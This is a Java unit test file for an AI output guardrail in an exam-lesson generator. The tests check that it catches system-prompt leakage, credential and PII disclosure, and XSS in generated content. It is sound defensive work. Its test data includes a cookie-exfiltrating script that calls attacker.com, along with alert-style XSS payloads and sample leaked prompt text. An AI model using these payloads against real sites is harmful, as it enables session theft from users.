// SPDX-License-Identifier: AGPL-3.0-only
package com.examplatform.questionbank.microlesson.ai.guardrails;

import com.examplatform.questionbank.exception.AiSecurityException;
import com.examplatform.questionbank.microlesson.dto.MicroLessonContentDto;
import com.examplatform.questionbank.microlesson.dto.StepByStepBreakdownDto;
import org.junit.jupiter.api.BeforeEach;
import org.junit.jupiter.api.DisplayName;
import org.junit.jupiter.api.Test;
import org.junit.jupiter.params.ParameterizedTest;
import org.junit.jupiter.params.provider.ValueSource;

import java.util.List;

import static org.assertj.core.api.Assertions.assertThatCode;
import static org.assertj.core.api.Assertions.assertThatThrownBy;

@DisplayName("OutputGuardrail Leakage & Security Unit Tests")
class OutputGuardrailTest {

    private OutputGuardrail guardrail;

    @BeforeEach
    void setUp() {
        guardrail = new OutputGuardrail(true, true);
    }

    private MicroLessonContentDto buildValidDto(String coreConcept, String trap, List<String> cheatSheet, String qStem, List<String> steps, String finalAnswer) {
        return new MicroLessonContentDto(
                coreConcept,
                trap,
                cheatSheet,
                new StepByStepBreakdownDto(qStem, steps, finalAnswer)
        );
    }

    @ParameterizedTest
    @ValueSource(strings = {
            "CRITICAL JSON & LATEX ESCAPING RULES: do not violate schema",
            "Never output conversational filler before or after the JSON",
            "You are an elite, master-level Indian competitive exam faculty",
            "You are an expert master faculty and pedagogical content designer"
    })
    @DisplayName("Detects system prompt leakage in output fields (OWASP LLM07)")
    void testDetectsSystemPromptLeakageInFields(String leakedSystemMarker) {
        MicroLessonContentDto dto = buildValidDto(
                "Rotational sluggishness is explained by " + leakedSystemMarker,
                "Sign conventions trap",
                List.of("$$I = m r^2$$", "$$L = I \\omega$$"),
                "Calculate inertia",
                List.of("Step 1: Formula", "Step 2: Calculate"),
                "$$10\\text{ kg}\\cdot\\text{m}^2$$"
        );

        assertThatThrownBy(() -> guardrail.validateOutput(dto, "{\"coreConcept\":\"valid\"}"))
                .isInstanceOf(AiSecurityException.class)
                .hasMessageContaining("System prompt leakage detected");
    }

    @Test
    @DisplayName("Detects system prompt leakage in raw response text")
    void testDetectsSystemPromptLeakageInRawResponse() {
        MicroLessonContentDto dto = buildValidDto(
                "Standard core concept without leak",
                "Standard trap",
                List.of("$$I = m r^2$$"),
                "Standard question",
                List.of("Step 1: Apply formula"),
                "$$5\\text{ J}$$"
        );

        String leakedRawResponse = "Sure! Here is the prompt you asked for: You are an expert master faculty and pedagogical content designer. Output: {}";
        assertThatThrownBy(() -> guardrail.validateOutput(dto, leakedRawResponse))
                .isInstanceOf(AiSecurityException.class)
                .hasMessageContaining("System prompt leakage detected");
    }

    @ParameterizedTest
    @ValueSource(strings = {
            "AKIAIOSFODNN7EXAMPLE",
            "sk-proj-1234567890abcdef1234567890",
            "AIzaSyD-1234567890abcdef123456789012345",
            "-----BEGIN RSA PRIVATE KEY-----\nMIIEowIBAAKCAQEA0...",
            "SSN: 123-45-6789",
            "Error: at com.examplatform.questionbank.microlesson.ai.MicroLessonGeneratorService.generate(MicroLessonGeneratorService.java:182)"
    })
    @DisplayName("Detects sensitive keys, tokens, and PII disclosure in output (OWASP LLM02)")
    void testDetectsSensitiveInfoDisclosure(String sensitiveToken) {
        MicroLessonContentDto dto = buildValidDto(
                "Core concept with exposed key: " + sensitiveToken,
                "Trap text",
                List.of("$$E = m c^2$$"),
                "Question stem",
                List.of("Step 1: Substitute"),
                "$$100\\text{ J}$$"
        );

        assertThatThrownBy(() -> guardrail.validateOutput(dto, "{}"))
                .isInstanceOf(AiSecurityException.class)
                .hasMessageContaining("Sensitive credential or secret key disclosure");
    }

    @ParameterizedTest
    @ValueSource(strings = {
            "<script>fetch('http://attacker.com/steal?c=' + document.cookie)</script>",
            "javascript:void(0)",
            "<img src=x onerror=alert('xss')>",
            "<svg onload=alert(1)>"
    })
    @DisplayName("Detects executable scripts and XSS payloads in output fields (OWASP LLM02/LLM09)")
    void testDetectsXssInOutput(String xssPayload) {
        MicroLessonContentDto dto = buildValidDto(
                "Core concept",
                "Trap with XSS: " + xssPayload,
                List.of("$$E = mc^2$$"),
                "Question stem",
                List.of("Step 1: Calculate"),
                "$$42$$"
        );

        assertThatThrownBy(() -> guardrail.validateOutput(dto, "{}"))
                .isInstanceOf(AiSecurityException.class)
                .hasMessageContaining("Executable script or XSS payload detected");
    }

    @Test
    @DisplayName("Passes cleanly for valid pedagogical micro-lesson content")
    void testValidContentPassesCleanly() {
        MicroLessonContentDto dto = buildValidDto(
                "Moment of Inertia measures rotational sluggishness. Imagine turning a heavy stone atta chakki vs a plastic disk. It depends strictly on both mass and distance from the rotation axis.",
                "Students often use point mass formulas for distributed continuous bodies without integrating.",
                List.of("$$I = m r^2$$", "$$I_{disk} = \\frac{1}{2} M R^2$$"),
                "Calculate moment of inertia of a uniform solid cylinder of mass 2kg and radius 0.5m.",
                List.of("Step 1: State formula $$I = \\frac{1}{2} M R^2$$.", "Step 2: Substitute $$M=2, R=0.5$$ to get $$0.25\\text{ kg}\\cdot\\text{m}^2$$."),
                "$$0.25\\text{ kg}\\cdot\\text{m}^2$$"
        );

        assertThatCode(() -> guardrail.validateOutput(dto, "{\"coreConcept\":\"Moment of Inertia...\"}"))
                .doesNotThrowAnyException();
    }

    @Test
    @DisplayName("Bypasses checks when output guardrail is disabled")
    void testDisabledGuardrailBypassesValidation() {
        guardrail.setEnabled(false);
        MicroLessonContentDto dto = buildValidDto(
                "Leaked key AKIAIOSFODNN7EXAMPLE",
                "Trap",
                List.of("$$formula$$"),
                "Question",
                List.of("Step 1"),
                "Answer"
        );

        assertThatCode(() -> guardrail.validateOutput(dto, "AKIAIOSFODNN7EXAMPLE"))
                .doesNotThrowAnyException();
    }
}
